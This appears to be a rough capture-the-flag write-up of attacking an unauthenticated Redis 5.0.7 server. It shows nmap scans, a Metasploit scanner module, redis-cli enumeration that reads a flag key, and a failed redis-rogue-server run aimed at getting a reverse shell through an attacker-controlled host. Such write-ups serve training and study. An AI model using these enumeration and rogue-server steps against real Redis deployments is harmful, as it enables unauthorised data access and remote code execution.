Nmap scanning: 
~~~
nmap -p- 10.129.192.120 -sV  
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 16:49 EDT
Stats: 0:06:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 68.31% done; ETC: 16:59 (0:03:04 remaining)
Stats: 0:09:44 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 86.79% done; ETC: 17:00 (0:01:29 remaining)
Nmap scan report for 10.129.192.120
Host is up (0.28s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 720.38 seconds
~~~


Redis:
Redis is **an open-source, in-memory data structure store that is widely used for caching, message brokering, and real-time analytics**. It supports various data structures, such as strings, lists, sets, hashes, and more. Redis uses a plain-text based protocol

~~~
>>use auxiliary/scanner/redis/redis_server
msf6 auxiliary(scanner/redis/redis_server) > show options

Module options (auxiliary/scanner/redis/redis_server):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   COMMAND   INFO             yes       The Redis command to run
   PASSWORD  foobared         no        Redis password for authentication test
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     6379             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/redis/redis_server) > set RHOSTS 10.129.192.120
RHOSTS => 10.129.192.120
msf6 auxiliary(scanner/redis/redis_server) > show options

Module options (auxiliary/scanner/redis/redis_server):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   COMMAND   INFO             yes       The Redis command to run
   PASSWORD  foobared         no        Redis password for authentication test
   RHOSTS    10.129.192.120   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     6379             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/redis/redis_server) > run
~~~


nc -vn 10.129.192.120 6379 
after this we know the information about the server
 and also use this 
 redis-cli -h 10.129.192.120
 info
cheat sheet for redis 
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]

after the info commond we find that database 0 has a 4 keys 

In that example the **database 0 and 1** are being used. **Database 0 contains 4 keys and database 1 contains 1**. By default Redis will use database 0.

# Keyspace
~~~
db0:keys=4,expires=0,avg_ttl=0
(0.78s)
10.129.10.123:6379> SELECT 0
OK
10.129.10.123:6379> Keys *
1) "numb"
2) "stor"
3) "flag"
4) "temp"
10.129.10.123:6379> get 
(error) ERR wrong number of arguments for 'get' command
(0.63s)
10.129.10.123:6379> get Keys
(nil)
(0.52s)
10.129.10.123:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
(0.55s)
10.129.10.123:6379> get numb
"bb2c8a7506ee45cc981eb88bb81dddab"
10.129.10.123:6379> 
~~~

KEYSPACES:
**the internal dictionary that Redis manages, in which all keys are stored**. Normally Redis keys are created without an associated time to live.


we try to get the shell to the db with tool redis-rogue-server can automatically get an interactive shell in redis and also get the reverse shell using this tool. but we have the error 
>>./redis-rogue-server.py --rhost 10.129.10.123 --lhost 10.10.14.168
>info] TARGET 10.129.10.123:6379
[info] SERVER 10.10.14.168:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
[err ] UnicodeDecodeError('gb18030', b'$614\r\na\x02\xca\x03\x02# Server\r\nredis_version:5.0.7\r\nredis_git_sha1:00000000\r\nredis_git_dirty:0\r\nredis_build_id:66bd629f924ac924\r\nredis_mode:standalone\r\nos:Linux 5.4.0-77-generic x86_64\r\narch_bits:64\r\nmultiplexing_api:epoll\r\natomicvar_api:atomic-builtin\r\ngcc_version:9.3.0\r\nprocess_id:754\r\nrun_id:2f2aee1fc7cc1ef95e26323bbd73ff26a77bb74d\r\ntcp_port:6379\r\nuptime_in_seconds:97\r\nuptime_in_days:0\r\nhz:10\r\nconfigured_hz:10\r\nlru_clock:8690626\r\nexecutable:/usr/bin/redis-server\r\nconfig_file:/etc/redis/redis.conf\r\n\r\n# Clients\r\nconnected_clients:1\r\nclient_recent_max_input_buffer:2\r\nclient_recent_max_output_buffer:0\r\nblocked_clients:0\r\n\r\n\r\n', 8, 9, 'illegal multibyte sequence')



i try the unauthenticate redis server but the http port is closed

>>>nmap -sC -sV  10.129.10.123 -p 80,6379 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:07 EDT
Nmap scan report for 10.129.10.123
Host is up (0.29s latency).

PORT     STATE  SERVICE VERSION
80/tcp   closed http
6379/tcp open   redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds



try to open the closed port using knock in nmap 

~~~
map knock -p 80 10.129.10.123        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 13:12 EDT
Failed to resolve "knock".
Nmap scan report for 10.129.10.123
Host is up (0.38s latency).

PORT   STATE  SERVICE
80/tcp closed http

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
~~~


https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis


 

